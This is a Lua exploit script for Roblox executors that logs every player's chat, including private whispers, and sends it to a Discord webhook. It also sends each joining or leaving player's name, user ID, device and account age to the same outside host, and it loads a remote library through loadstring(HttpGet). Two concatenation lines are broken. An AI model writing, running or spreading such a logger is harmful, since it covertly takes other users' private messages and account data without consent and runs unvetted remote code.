-- chat logger | discord webhook 

-- getgenv().webhook_url = "" -- put discord webhook here

local main = loadstring(game:HttpGet("https://raw.githubusercontent.com/GameSTALkER/synapse.luas/main/UiLibs/NotifyLib.lua"))()
local req = (syn and syn.request) or (http and http.request) or http_request
local function SendWebhook(the_content, the_name)
    if req then req({Url = getgenv().webhook_url, Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = game:GetService('HttpService'):JSONEncode({content = the_content, username = the_name})}) end
end

if not getgenv().chatlogger and getgenv().webhook_url ~= nil then
    spawn(function()
        for i,e621 in pairs(game.Players:GetChildren()) do
            e621.Chatted:Connect(function(furaffinity)
                if furaffinity:sub(1,2):lower() == "/w" then
				    SendWebhook("```lua\n" .. tostring(furaffinity) .. "```", 'DM: "' .. tostring(e621.name) .. '"')

                elseif furaffinity:sub(1,2):lower() == "/e" then
					SendWebhook("```lua\n" .. tostring(furaffinity) .. "```", 'Emotion: "' .. tostring(e621.name) .. '"')

                else
                    SendWebhook("```lua\n" .. tostring(furaffinity) .. "```", 'Message: "' .. tostring(e621.Name) .. '"')

                end
            end)
        end
        game.Players.PlayerAdded:Connect(function(transfurmationyiff)
            SendWebhook("```lua\n" .. 'Name: "' .. tostring(transfurmationyiff.Name) .. '"\nUserid: "' .. tostring(transfurmationyiff.UserId) '"\nDevice: "' .. tostring(transfurmationyiff.OsPlatform) .. '"\nAccountAge: "' .. tostring(transfurmationyiff.AccountAge) .. '"```', tostring(transfurmationyiff.Name) .. " joined |")
            transfurmationyiff.Chatted:Connect(function(salembad)
                if salembad:sub(1,2):lower() == "/w" then
				    SendWebhook("```lua\n" .. tostring(salembad) .. "```", 'DM: "' .. tostring(transfurmationyiff.name) .. '"')

                elseif salembad:sub(1,2):lower() == "/e" then
					SendWebhook("```lua\n" .. tostring(salembad) .. "```", 'Emotion: "' .. tostring(transfurmationyiff.Name) .. '"')

                else
                    SendWebhook("```lua\n" .. tostring(salembad) .. "```", 'Message: "' .. tostring(transfurmationyiff.Name) .. '"')

                end
            end)
        end)
    end)
    game.Players.PlayerRemoving:Connect(function(lucario)
        SendWebhook("```lua\n" .. 'Name: "' .. tostring(lucario.Name) .. '"\nUserid: "' .. tostring(lucario.UserId) '"\nDevice: "' .. tostring(lucario.OsPlatform) .. '"\nAccountAge: "' .. tostring(lucario.AccountAge) .. '"```', tostring(lucario) .. " left |")
    end)
    getgenv().chatlogger = true
elseif getgenv().chatlogger then
    print('Already executed.')
    main:GenNotify(1,"BottomRight","Dark",nil,"Tween","ERROR","Already executed",3)
else
    print('WEBHOOK NOT FOUND')
    main:GenNotify(1,"BottomRight","Dark",nil,"Tween","ERROR","WEBHOOK NOT FOUND\nAdd getgenv().webhook_url = \"WEBHOOK URL\"\nTo your autoexec file",8)
end